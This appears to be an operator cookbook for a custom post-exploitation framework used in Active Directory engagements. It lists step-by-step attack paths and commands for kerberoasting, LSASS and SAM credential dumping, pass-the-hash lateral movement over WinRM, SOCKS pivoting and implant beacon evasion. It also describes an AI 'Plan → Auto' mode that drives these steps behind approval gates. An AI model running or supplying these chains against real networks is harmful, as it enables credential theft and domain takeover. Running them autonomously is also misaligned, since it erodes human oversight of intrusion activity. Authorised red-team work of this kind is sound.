# AD engagement cookbook (Sprint 1–2)

Focused **internal AD post-ex** path. Not an MSF replacement.

## Sprint 1 path (golden)

```
foothold (implant)
  → recon (whoami, ifconfig, processes)
  → ldap_enum kerberoastable
  → kerberoast
  → mission_complete / summarize
```

Approvals: `ldap_enum`, `kerberoast` (high).

## Soft-compromise path (Support / Logging style)

```
foothold (implant)
  → recon
  → smb list_shares / list_dir / download (anon or creds)
  → ldap_enum interesting (+ kerberoastable) with password or ntlm_hash
  → lateral winrm <target> <cmd> --user u --pass p   # or --hash <NT>
  → summarize (no DA abuse unless objective requires)
```

Approvals: `smb`, `ldap_enum`, `lateral_move` (high/critical).

## Sprint 2 path (job-complete)

```
… golden path …
  → creds_dump lsass|sam (approve)
  → lateral_move winrm|wmi to one host (approve)
  → socks_start (optional)
  → summarize loot
```

## Operator commands (quick)

```text
sessions
use <id>
shell whoami
ifconfig
smb list_shares --host 10.10.10.10 --anon
smb list_dir --host 10.10.10.10 --share support-tools --anon
smb download --host 10.10.10.10 --share Logs --path IdentitySync_Trace.log --user u --pass p
ldap-enum interesting --domain DOM --dc dc.dom.local --user u --pass p
ldap-enum kerberoastable --domain DOM --dc dc.dom.local --hash <NT>
pending / approve <id>
kerberoast --domain DOM --dc dc.dom.local --user u --pass p
creds-dump lsass
lateral winrm <target> <cmd> --user u --pass p
lateral winrm <target> <cmd> --user u --hash <NThash> --domain DOM
loot
```

## AI

```text
ai
# Plan → Auto
# Frozen objective in docs/GOLDEN_DEMO.md
```

## OPSEC

- Prefer `generate --language c` for Windows when toolchain available  
- Interactive eng: `--sleep 500`  
- Production: higher sleep + jitter  
